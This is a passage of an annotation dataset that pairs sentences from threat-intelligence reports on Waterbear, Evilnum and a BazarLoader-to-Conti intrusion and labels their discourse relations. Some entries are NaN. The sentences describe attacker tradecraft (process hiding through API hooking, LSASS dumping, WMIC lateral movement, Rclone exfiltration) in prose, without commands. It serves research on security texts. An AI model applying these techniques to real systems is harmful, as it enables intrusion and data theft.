        "S2": "After \u201cGetExtendedTcpTable\u201d is executed and the process returns back to the second part of the code",
        "relation": "MISC"
    },
    {
        "S1": "After \u201cGetExtendedTcpTable\u201d is executed and the process returns back to the second part of the code",
        "S2": ", it iteratively checks every record in the returned Tcp table.",
        "relation": "NEXT"
    },
    {
        "S1": ", it iteratively checks every record in the returned Tcp table.",
        "S2": "If any record contains the PID Waterbear wants to hide, it will remove the corresponding record, modify the record number inside the table, and continue to check the succeeding records.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If any record contains the PID Waterbear wants to hide, it will remove the corresponding record, modify the record number inside the table, and continue to check the succeeding records.",
        "S2": "In the end, it returns the modified table.",
        "relation": "NEXT"
    },
    {
        "S1": "In the end, it returns the modified table.",
        "S2": "Rather than directly disabling these two functions, this method of using API hooking makes noticing malicious behaviors more difficult, especially since both functions still work and return results normally.",
        "relation": "MISC"
    },
    {
        "S1": "Rather than directly disabling these two functions, this method of using API hooking makes noticing malicious behaviors more difficult, especially since both functions still work and return results normally.",
        "S2": "Although in this case, the affected process is specified in the first-stage shellcode, the API hooking logic is quite generic that the same piece of shellcode can be used to hook other vendors' products.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Targets are approached with spearphishing emails that contain a link to a ZIP file hosted on Google Drive.",
        "S2": "That archive contains several LNK (aka shortcut) files that extract and execute a malicious JavaScript component, while displaying a decoy document.",
        "relation": "NEXT"
    },
    {
        "S1": "That archive contains several LNK (aka shortcut) files that extract and execute a malicious JavaScript component, while displaying a decoy document.",
        "S2": "These shortcut files have \u201cdouble extensions\u201d to try to trick the user into opening them, thinking they are benign documents or pictures (in Windows, file extensions for known file types are hidden by default).",
        "relation": "ELABORATION"
    },
    {
        "S1": "These shortcut files have \u201cdouble extensions\u201d to try to trick the user into opening them, thinking they are benign documents or pictures (in Windows, file extensions for known file types are hidden by default).",
        "S2": "The contents of one of the ZIP files are shown in Figure 1.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The contents of one of the ZIP files are shown in Figure 1.",
        "S2": "Once a shortcut file is opened (it doesn\u2019t matter which one, as they all do the same thing), it looks in the contents of its own file for lines with a specific marker and writes them to a .js file.",
        "relation": "MISC"
    },
    {
        "S1": "Once a shortcut file is opened (it doesn\u2019t matter which one, as they all do the same thing), it looks in the contents of its own file for lines with a specific marker and writes them to a .js file.",
        "S2": "Then this malicious JavaScript file is executed and it writes and opens a decoy file with the same name as the shortcut, but with the correct extension.",
        "relation": "NEXT"
    },
    {
        "S1": "Then this malicious JavaScript file is executed and it writes and opens a decoy file with the same name as the shortcut, but with the correct extension.",
        "S2": "It also deletes the shortcut file.",
        "relation": "NEXT"
    },
    {
        "S1": "It also deletes the shortcut file.",
        "S2": "The documents used as decoys are mostly photos of credit cards, identity documents, or bills with proof of address, as many financial institutions require these documents from their customers when they join, according to regulations (this is known as \u201cKnow Your Customer\u201d).",
        "relation": "MISC"
    },
    {
        "S1": "The documents used as decoys are mostly photos of credit cards, identity documents, or bills with proof of address, as many financial institutions require these documents from their customers when they join, according to regulations (this is known as \u201cKnow Your Customer\u201d).",
        "S2": "One such decoy is shown in Figure 2 (blurred for privacy).",
        "relation": "ELABORATION"
    },
    {
        "S1": "One such decoy is shown in Figure 2 (blurred for privacy).",
        "S2": "These decoy documents seem genuine, and we assume that they have been collected by this group during years of operation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These decoy documents seem genuine, and we assume that they have been collected by this group during years of operation.",
        "S2": "Documents are collected actively in the group\u2019s current operations, as it targets technical support representatives and account managers, who regularly receive these kinds of documents from their customers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Documents are collected actively in the group\u2019s current operations, as it targets technical support representatives and account managers, who regularly receive these kinds of documents from their customers.",
        "S2": "The group reuses the documents on different targets, unless the targets are from different regions.",
        "relation": "NEXT"
    },
    {
        "S1": "The group reuses the documents on different targets, unless the targets are from different regions.",
        "S2": "The JavaScript component is the first stage of the attack and can deploy other malware such as a C# spy component, Golden Chickens components or several Python-based tools.",
        "relation": "MISC"
    },
    {
        "S1": "The JavaScript component is the first stage of the attack and can deploy other malware such as a C# spy component, Golden Chickens components or several Python-based tools.",
        "S2": "The name Evilnum was given to the C# component by other researchers in the past, but the JS component also has been referred to as Evilnum.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The name Evilnum was given to the C# component by other researchers in the past, but the JS component also has been referred to as Evilnum.",
        "S2": "We have named the group Evilnum as that is the name of their flagship malware, and we\u2019ll refer to the various malware pieces as components.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We have named the group Evilnum as that is the name of their flagship malware, and we\u2019ll refer to the various malware pieces as components.",
        "S2": "An overview of these is shown in Figure 3.",
        "relation": "ELABORATION"
    },
    {
        "S1": "An overview of these is shown in Figure 3.",
        "S2": "Each of the various components has its own C&C server, and each component operates independently.",
        "relation": "MISC"
    },
    {
        "S1": "Each of the various components has its own C&C server, and each component operates independently.",
        "S2": "The operators of the malware manually send commands to install additional components and use post-compromise scripts and tools if they consider them necessary.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The operators of the malware manually send commands to install additional components and use post-compromise scripts and tools if they consider them necessary.",
        "S2": "Most servers used by the malware are referenced by IP addresses; domain names have not been used.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Most servers used by the malware are referenced by IP addresses; domain names have not been used.",
        "S2": "The only exceptions are the C&C servers used by the Golden Chickens components; malware purchased from a MaaS provider, as we describe later.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The only exceptions are the C&C servers used by the Golden Chickens components; malware purchased from a MaaS provider, as we describe later.",
        "S2": "Those referenced by an IP address can be split into two groups, based on the hosting provider.",
        "relation": "MISC"
    },
    {
        "S1": "Those referenced by an IP address can be split into two groups, based on the hosting provider.",
        "S2": "The majority of them are hosted with FreeHost, a Ukrainian provider.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The majority of them are hosted with FreeHost, a Ukrainian provider.",
        "S2": "The rest are hosted in the Netherlands, with Dotsi.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The rest are hosted in the Netherlands, with Dotsi.",
        "S2": "This component communicates with a C&C server and acts as a backdoor without the need for any additional program.",
        "relation": "MISC"
    },
    {
        "S1": "This component communicates with a C&C server and acts as a backdoor without the need for any additional program.",
        "S2": "However, in most attacks that we have seen, the attackers deployed additional components as they saw fit and used the JS malware only as a first stage.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, in most attacks that we have seen, the attackers deployed additional components as they saw fit and used the JS malware only as a first stage.",
        "S2": "The first known mention of this JavaScript malware was in May 2018 in this pwncode article.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first known mention of this JavaScript malware was in May 2018 in this pwncode article.",
        "S2": "The malware has changed since then and we illustrate these changes in Figure 4.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware has changed since then and we illustrate these changes in Figure 4.",
        "S2": "Differences between version 1.3 and the others are noteworthy, as the server-side code for the C&C was changed and commands are different.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Differences between version 1.3 and the others are noteworthy, as the server-side code for the C&C was changed and commands are different.",
        "S2": "In that early version it was not possible to upload files to the C&C, only to download files to the victim\u2019s computer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In that early version it was not possible to upload files to the C&C, only to download files to the victim\u2019s computer.",
        "S2": "Also, as new versions appeared, the malware was extended with some Python scripts (see the Post-compromise toolset section) and external tools such as ChromeCookiesView.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Also, as new versions appeared, the malware was extended with some Python scripts (see the Post-compromise toolset section) and external tools such as ChromeCookiesView.",
        "S2": "Despite the differences, the core functionalities remain the same in all versions, including the retrieval of the C&C server\u2019s address from GitHub, GitLab or Reddit pages created specifically for that purpose.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Despite the differences, the core functionalities remain the same in all versions, including the retrieval of the C&C server\u2019s address from GitHub, GitLab or Reddit pages created specifically for that purpose.",
        "S2": "Figure 5 shows an example of a Reddit page that is parsed by the malware to retrieve a C&C address.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Figure 5 shows an example of a Reddit page that is parsed by the malware to retrieve a C&C address.",
        "S2": "This component achieves persistence through the Run registry key and has full backdoor capabilities: it can download and execute binaries, run arbitrary commands or upload files from the victim computer to the C&C server.",
        "relation": "NEXT"
    },
    {
        "S1": "This component achieves persistence through the Run registry key and has full backdoor capabilities: it can download and execute binaries, run arbitrary commands or upload files from the victim computer to the C&C server.",
        "S2": "We will not go into details about the technical aspects of this component, as a good analysis of the latest version was published recently by Prevailion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We will not go into details about the technical aspects of this component, as a good analysis of the latest version was published recently by Prevailion.",
        "S2": "In March 2019, Palo Alto Networks described malware with very similar functionality to the JS component, but coded in C#.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In March 2019, Palo Alto Networks described malware with very similar functionality to the JS component, but coded in C#.",
        "S2": "That version (2.5) obtained the address of its C&C by dividing a number by 666, and was therefore named Evilnum by Palo Alto Networks researchers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "That version (2.5) obtained the address of its C&C by dividing a number by 666, and was therefore named Evilnum by Palo Alto Networks researchers.",
        "S2": "Since then there have been new versions of the C# malware, the latest of them being version 4.0, which we first saw in April 2020.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Since then there have been new versions of the C# malware, the latest of them being version 4.0, which we first saw in April 2020.",
        "S2": "The number 666 is not used anymore and the PDB paths of the executables show that the developers call their malware \u201cMarvel\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The number 666 is not used anymore and the PDB paths of the executables show that the developers call their malware \u201cMarvel\u201d.",
        "S2": "However, we will continue to name the malware Evilnum to avoid creating confusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, we will continue to name the malware Evilnum to avoid creating confusion.",
        "S2": "The latest version comes bundled in an MSI file (Windows Installer) and runs independent of the JS component.",
        "relation": "MISC"
    },
    {
        "S1": "The latest version comes bundled in an MSI file (Windows Installer) and runs independent of the JS component.",
        "S2": "Furthermore, it has different C&Cs than the JS component.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Furthermore, it has different C&Cs than the JS component.",
        "S2": "However, in all cases that we have seen, the C# component was downloaded and executed after the JavaScript malware gained initial access.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, in all cases that we have seen, the C# component was downloaded and executed after the JavaScript malware gained initial access.",
        "S2": "The structure of this component is shown in Figure 6.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The structure of this component is shown in Figure 6.",
        "S2": NaN,
        "relation": "MISC"
    },
    {
        "S1": NaN,
        "S2": "When the MSI file is executed, three malicious components, along with some .NET Framework library files, are written to disk in %LOCALAPPDATA%\\Microsoft\\Mediia.",
        "relation": "MISC"
    },
    {
        "S1": "When the MSI file is executed, three malicious components, along with some .NET Framework library files, are written to disk in %LOCALAPPDATA%\\Microsoft\\Mediia.",
        "S2": "The file copier is the first to be executed and its only purpose is to move the files to another location in %LOCALAPPDATA% (see the Indicators of Compromise section for the folder names).",
        "relation": "NEXT"
    },
    {
        "S1": "The file copier is the first to be executed and its only purpose is to move the files to another location in %LOCALAPPDATA% (see the Indicators of Compromise section for the folder names).",
        "S2": "The loader is then executed and it loads and decrypts the contents of the file System.Memmory.dll, which is the actual malicious payload (DLL Agent) for the C# component.",
        "relation": "NEXT"
    },
    {
        "S1": "The loader is then executed and it loads and decrypts the contents of the file System.Memmory.dll, which is the actual malicious payload (DLL Agent) for the C# component.",
        "S2": "AES encryption is used for the DLL and for obfuscation of the strings in the payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "AES encryption is used for the DLL and for obfuscation of the strings in the payload.",
        "S2": "The same key and initialization vector are used to encrypt the strings in all of the different versions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The same key and initialization vector are used to encrypt the strings in all of the different versions.",
        "S2": "The IP address of the C&C server is hardcoded and in plain text.",
        "relation": "MISC"
    },
    {
        "S1": "The IP address of the C&C server is hardcoded and in plain text.",
        "S2": "A GET request is sent for /Validate/valsrv and if the response body contains the text youwillnotfindthisanywhare, then the server is accepted.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A GET request is sent for /Validate/valsrv and if the response body contains the text youwillnotfindthisanywhare, then the server is accepted.",
        "S2": "Otherwise, a GitLab page is parsed to get the IP address of a second server.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "Otherwise, a GitLab page is parsed to get the IP address of a second server.",
        "S2": "The following capabilities are present in version 4.0:",
        "relation": "MISC"
    },
    {
        "S1": "The following capabilities are present in version 4.0:",
        "S2": "Take screenshots if the mouse has been moved in a period of time, and send them to the C&C, base64 encoded.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Take screenshots if the mouse has been moved in a period of time, and send them to the C&C, base64 encoded.",
        "S2": "The image is stored in a file called SC4.P7D",
        "relation": "NEXT"
    },
    {
        "S1": "The image is stored in a file called SC4.P7D",
        "S2": "- Run commands",
        "relation": "NEXT"
    },
    {
        "S1": "- Run commands",
        "S2": "- Run other binaries via cmd.exe",
        "relation": "NEXT"
    },
    {
        "S1": "- Run other binaries via cmd.exe",
        "S2": "- Send information such as computer name, username and antivirus installed",
        "relation": "NEXT"
    },
    {
        "S1": "- Send information such as computer name, username and antivirus installed",
        "S2": "- Persist in a compromised system by creating registry keys",
        "relation": "NEXT"
    },
    {
        "S1": "In August, we witnessed an intrusion that started from a BazarLoader infection.",
        "S2": "A Phishing campaign distributing password-protected zip files with weaponized documents to victims was the likely delivery source.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A Phishing campaign distributing password-protected zip files with weaponized documents to victims was the likely delivery source.",
        "S2": "Macros inside the word document extracted and executed a malicious .HTA document, which downloaded and loaded the BazarLoader DLL in memory.",
        "relation": "NEXT"
    },
    {
        "S1": "Macros inside the word document extracted and executed a malicious .HTA document, which downloaded and loaded the BazarLoader DLL in memory.",
        "S2": "It is now apparent to the information security community that intrusions starting with BazarLoader frequently end with Conti ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "It is now apparent to the information security community that intrusions starting with BazarLoader frequently end with Conti ransomware.",
        "S2": "This case saw such a conclusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This case saw such a conclusion.",
        "S2": "There are some evident similarities in cases that involve Conti ransomware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "There are some evident similarities in cases that involve Conti ransomware.",
        "S2": "Ransomware operators\u2019 tooling and overall tasks performed tend to match across the cluster.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Ransomware operators\u2019 tooling and overall tasks performed tend to match across the cluster.",
        "S2": "When we look at our earlier Conti case, this becomes noticeable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When we look at our earlier Conti case, this becomes noticeable.",
        "S2": "This could be due to the widely circulated Conti manual that was leaked by an affiliate.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This could be due to the widely circulated Conti manual that was leaked by an affiliate.",
        "S2": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "relation": "MISC"
    },
    {
        "S1": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "S2": "Even though the intrusion lasted for five days total, Cobalt Strike and hands-on keyboard operators showed up in the first two hours of the intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Even though the intrusion lasted for five days total, Cobalt Strike and hands-on keyboard operators showed up in the first two hours of the intrusion.",
        "S2": "Straight away, they started gathering information to get the lay of the land using Net commands.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Straight away, they started gathering information to get the lay of the land using Net commands.",
        "S2": "Then they continued looking for open shares by executing the PowerView module, Invoke-ShareFinder.",
        "relation": "NEXT"
    },
    {
        "S1": "Then they continued looking for open shares by executing the PowerView module, Invoke-ShareFinder.",
        "S2": "After collecting and dissecting the results from ShareFinder, they appeared to have a good understanding of the server and workstation layout of the organization as they started executing commands to gather information from specific, high-value servers.",
        "relation": "NEXT"
    },
    {
        "S1": "After collecting and dissecting the results from ShareFinder, they appeared to have a good understanding of the server and workstation layout of the organization as they started executing commands to gather information from specific, high-value servers.",
        "S2": "During that time, we saw errors when operators failed to alter specific parameters that indicate the operator is acting from a pre-defined playbook.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During that time, we saw errors when operators failed to alter specific parameters that indicate the operator is acting from a pre-defined playbook.",
        "S2": "They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.",
        "S2": "Once they had access to the remote server via the Cobalt Strike beacon, they re-ran Invoke-ShareFinder and then exfiltrated data of interest from a different server using the Rclone application via the MEGA cloud storage service.",
        "relation": "NEXT"
    },
    {
        "S1": "Once they had access to the remote server via the Cobalt Strike beacon, they re-ran Invoke-ShareFinder and then exfiltrated data of interest from a different server using the Rclone application via the MEGA cloud storage service.",
        "S2": "On the second day, the threat actors used RDP to access the backup server and in doing so, reviewed the backup settings, and running processes on the server via the taskmanager GUI.",
        "relation": "NEXT"
    },
    {
        "S1": "On the second day, the threat actors used RDP to access the backup server and in doing so, reviewed the backup settings, and running processes on the server via the taskmanager GUI.",
        "S2": "On day four, the threat actors returned and ran another round of exfiltration using Rclone and MEGA again.",
        "relation": "NEXT"
    },
    {
        "S1": "On day four, the threat actors returned and ran another round of exfiltration using Rclone and MEGA again.",
        "S2": "On the fifth day, they moved fast towards their final objective, which was Conti ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "On the fifth day, they moved fast towards their final objective, which was Conti ransomware.",
        "S2": "Before executing Conti, they used RDP to install and configure the AnyDesk remote desktop application.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Before executing Conti, they used RDP to install and configure the AnyDesk remote desktop application.",
        "S2": "Having GUI access, they attempted to use ProcessHacker to dump the LSASS process.",
        "relation": "NEXT"
    },
    {
        "S1": "Having GUI access, they attempted to use ProcessHacker to dump the LSASS process.",
        "S2": "After this last step, they deployed Conti ransomware via a batch script to all domain joined systems.",
        "relation": "NEXT"
    },
    {
        "S1": "After this last step, they deployed Conti ransomware via a batch script to all domain joined systems.",
        "S2": "One interesting fact about this case is that the threat actors were not seen interacting with the Domain Controllers (DCs).",
        "relation": "MISC"
    },
    {
        "S1": "One interesting fact about this case is that the threat actors were not seen interacting with the Domain Controllers (DCs).",
        "S2": "Most ransomware cases we see involve the threat actor executing code on the DCs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Most ransomware cases we see involve the threat actor executing code on the DCs.",
        "S2": "Thanks to @James_inthe_box for the sample!",
        "relation": "MISC"
    },
    {
        "S1": "Thanks to @James_inthe_box for the sample!",
        "S2": "As with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload.",
        "relation": "MISC"
    },
    {
        "S1": "As with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload.",
        "S2": "The user is presented with the following:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The user is presented with the following:",
        "S2": "Reviewing the file we can observe that the filetype while labeled as a .doc file appears as XML when reviewing the file attributes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Reviewing the file we can observe that the filetype while labeled as a .doc file appears as XML when reviewing the file attributes.",
        "S2": "A deeper inspection shows the Word 2003 XML formatting and the contained macro.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A deeper inspection shows the Word 2003 XML formatting and the contained macro.",
        "S2": "Once the macro has been enabled, in the next stage, an HTML Application (HTA) file is created and dropped into the user\u2019s folder:",
        "relation": "NEXT"
    },
    {
        "S1": "Once the macro has been enabled, in the next stage, an HTML Application (HTA) file is created and dropped into the user\u2019s folder:",
        "S2": "Followed by the execution of the HTA:",
        "relation": "NEXT"
    },
    {
        "S1": "Followed by the execution of the HTA:",
        "S2": "Analysis of the HTA file shows a mix of encoded HTML and JavaScript/VBScript code, not to mention profanity at the start of the file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Analysis of the HTA file shows a mix of encoded HTML and JavaScript/VBScript code, not to mention profanity at the start of the file.",
        "S2": "The base64 encoded string can be decoded to:",
        "relation": "MISC"
    },
    {
        "S1": "The base64 encoded string can be decoded to:",
        "S2": "The code downloads a binary file (compareForfor.jpg) masquerading as a JPG (Image file) from millscruelg[.]com to the following folder \u201cc:\\users\\public\u201d, and incorporating VBScript code, utilizes REGSVR32 to execute this DLL.",
        "relation": "MISC"
    },
    {
        "S1": "The code downloads a binary file (compareForfor.jpg) masquerading as a JPG (Image file) from millscruelg[.]com to the following folder \u201cc:\\users\\public\u201d, and incorporating VBScript code, utilizes REGSVR32 to execute this DLL.",
        "S2": "This initiates a connection to 64.227.65[.]60:443 and invokes a Svchost.exe, followed by a lookup to myexternalip[.]com to retrieve the external public-facing IPv4 address of the network.",
        "relation": "NEXT"
    },
    {
        "S1": "This initiates a connection to 64.227.65[.]60:443 and invokes a Svchost.exe, followed by a lookup to myexternalip[.]com to retrieve the external public-facing IPv4 address of the network.",
        "S2": "The attacker could use this information to verify the network being targeted and/or to facilitate tool configuration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attacker could use this information to verify the network being targeted and/or to facilitate tool configuration.",
        "S2": "Two DLLs were loaded via RunDll32 using the Svchost process.",
        "relation": "MISC"
    },
    {
        "S1": "Two DLLs were loaded via RunDll32 using the Svchost process.",
        "S2": "The first was D574.dll:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first was D574.dll:",
        "S2": "Followed by D8B3.dll:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Followed by D8B3.dll:",
        "S2": "D8B3.dll injected into the Winlogon process (high integrity):",
        "relation": "ELABORATION"
    },
    {
        "S1": "D8B3.dll injected into the Winlogon process (high integrity):",
        "S2": "In the case of D8B3.dll, the DLL was Go compiled.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the case of D8B3.dll, the DLL was Go compiled.",
        "S2": "Both DLLs had invalid certificates and could be detected by checking for any failed/revoked status.:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Both DLLs had invalid certificates and could be detected by checking for any failed/revoked status.:",
        "S2": "Additionally, each DLL had no populated metadata relating to the DLL:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Additionally, each DLL had no populated metadata relating to the DLL:",
        "S2": "The process hierarchy tree visualization below:",
        "relation": "MISC"
    },
    {
        "S1": "The process hierarchy tree visualization below:",
        "S2": "This is very similar to the Bazarloader analysis by Brad Duncan on 11/08/2021.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is very similar to the Bazarloader analysis by Brad Duncan on 11/08/2021.",
        "S2": "We observed the AnyDesk application created under the folder c:\\users\\<REDACTED>\\Videos\u2019, an unusual location and suspicious location for process activity \u2013 this is a good detection opportunity where portable executables appear on non-standard file system locations.",
        "relation": "MISC"
    },
    {
        "S1": "We observed the AnyDesk application created under the folder c:\\users\\<REDACTED>\\Videos\u2019, an unusual location and suspicious location for process activity \u2013 this is a good detection opportunity where portable executables appear on non-standard file system locations.",
        "S2": "AnyDesk is a closed source remote desktop application that is available for several operating systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "AnyDesk is a closed source remote desktop application that is available for several operating systems.",
        "S2": "It is free for private use.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is free for private use.",
        "S2": "We observed a long connection initiated from the AnyDesk application towards legitimately registered IPv4 ranges.",
        "relation": "MISC"
    },
    {
        "S1": "We observed a long connection initiated from the AnyDesk application towards legitimately registered IPv4 ranges.",
        "S2": "However, we did not observe many events of interest during these sessions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, we did not observe many events of interest during these sessions.",
        "S2": "ProcessHacker was also dropped in the root of C:\\ and likely used to access the LSASS process.",
        "relation": "MISC"
    },
    {
        "S1": "ProcessHacker was also dropped in the root of C:\\ and likely used to access the LSASS process.",
        "S2": "The use of utilities such as ProcessHacker would be unusual for typical users, and applications from a C:\\ root would also be suspicious in certain environments.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The use of utilities such as ProcessHacker would be unusual for typical users, and applications from a C:\\ root would also be suspicious in certain environments.",
        "S2": "Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time.",
        "relation": "MISC"
    },
    {
        "S1": "Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time.",
        "S2": "Examples included:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Examples included:",
        "S2": "While running some of these commands, copy paste errors were present indicating the operator is likely working from a runbook, like the leaked Conti manual from August as seen via the tasklist /s ip rather than the actual host systems IP\u2019s and seen right after this mistake.",
        "relation": "MISC"
    },
    {
        "S1": "While running some of these commands, copy paste errors were present indicating the operator is likely working from a runbook, like the leaked Conti manual from August as seen via the tasklist /s ip rather than the actual host systems IP\u2019s and seen right after this mistake.",
        "S2": "Cmd.exe process invoked a lot of the commands with unusual parent processes such as RunDLL32.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Cmd.exe process invoked a lot of the commands with unusual parent processes such as RunDLL32.exe.",
        "S2": "The example below using the time command:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The example below using the time command:",
        "S2": "Red Canary provides a good detection guide for RunDLL32; this covers unusual RunDLL32 activity such as command less, unusual spawned activity, etc.",
        "relation": "MISC"
    },
    {
        "S1": "Red Canary provides a good detection guide for RunDLL32; this covers unusual RunDLL32 activity such as command less, unusual spawned activity, etc.",
        "S2": "Discovery command invocation:",
        "relation": "MISC"
    },
    {
        "S1": "Discovery command invocation:",
        "S2": "AdFind was observed via a file write for the binary, but there was no evidence of execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "AdFind was observed via a file write for the binary, but there was no evidence of execution.",
        "S2": "File share enumeration was achieved using the PowerShell Invoke-ShareFinder script, part of PowerView.",
        "relation": "ELABORATION"
    },
    {
        "S1": "File share enumeration was achieved using the PowerShell Invoke-ShareFinder script, part of PowerView.",
        "S2": "The output file was created at c:\\ProgramData\\found_shares.txt.",
        "relation": "NEXT"
    },
    {
        "S1": "The output file was created at c:\\ProgramData\\found_shares.txt.",
        "S2": "The use of this tool has been observed in other recent intrusions.",
        "relation": "MISC"
    },
    {
        "S1": "The use of this tool has been observed in other recent intrusions.",
        "S2": "PowerShell was invoked by the WinLogon process and the resulting file created by Rundll32.exe",
        "relation": "MISC"
    },
    {
        "S1": "PowerShell was invoked by the WinLogon process and the resulting file created by Rundll32.exe",
        "S2": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
        "relation": "NEXT"
    },
    {
        "S1": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
        "S2": "After reviewing the backups, they also opened taskmanager via the GUI (indicated by the /4 in the process command line) to review the running processes on the system.",
        "relation": "NEXT"
    },
    {
        "S1": "After reviewing the backups, they also opened taskmanager via the GUI (indicated by the /4 in the process command line) to review the running processes on the system.",
        "S2": "A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:",
        "relation": "NEXT"
    },
    {
        "S1": "A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:",
        "S2": "Remote process execution achieved using WMI invoking Rundll32 to load the 143.dll (Cobalt Strike beacon) on the target host:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Remote process execution achieved using WMI invoking Rundll32 to load the 143.dll (Cobalt Strike beacon) on the target host:",
        "S2": "The Cobalt Strike beacon (143.dll) injected into the svchost process \u2018svchost.exe -k UnistackSvcGroup -s CDPUserSvc\u2019:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Cobalt Strike beacon (143.dll) injected into the svchost process \u2018svchost.exe -k UnistackSvcGroup -s CDPUserSvc\u2019:",
        "S2": "Followed by a request to checkauj[.]com (82.117.252.143).",
        "relation": "NEXT"
    },
    {
        "S1": "Followed by a request to checkauj[.]com (82.117.252.143).",
        "S2": "Approximately 9 hours later, the attacker established an RDP session via the 143.dll.",
        "relation": "NEXT"
    },
    {
        "S1": "Approximately 9 hours later, the attacker established an RDP session via the 143.dll.",
        "S2": "This was achieved very early in the intrusion, and we were able to correlate the activity:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was achieved very early in the intrusion, and we were able to correlate the activity:",
        "S2": "During this event, we believe that the attacker disclosed the remote workstation name \u2018win-344vu98d3ru\u2019.",
        "relation": "MISC"
    },
    {
        "S1": "During this event, we believe that the attacker disclosed the remote workstation name \u2018win-344vu98d3ru\u2019.",
        "S2": "The Bazar DLL masquerading as a jpg made use of HTTPS C2 throughout the full length of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The Bazar DLL masquerading as a jpg made use of HTTPS C2 throughout the full length of the intrusion.",
        "S2": "The first DLL [D574.dll] didn\u2019t produce any immediate follow on activity, whereas D8B3.dll was loaded by RunDll32 and associated with many activities, from file creation, process execution and persistent network connectivity to 82.117.252[.]143:443 throughout the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The first DLL [D574.dll] didn\u2019t produce any immediate follow on activity, whereas D8B3.dll was loaded by RunDll32 and associated with many activities, from file creation, process execution and persistent network connectivity to 82.117.252[.]143:443 throughout the intrusion.",
        "S2": "D574.dll loaded by RunDll32 process with persistent DNS query activity to volga.azureedge[.]net, but no established network connectivity.",
        "relation": "ELABORATION"
    },
    {
        "S1": "D574.dll loaded by RunDll32 process with persistent DNS query activity to volga.azureedge[.]net, but no established network connectivity.",
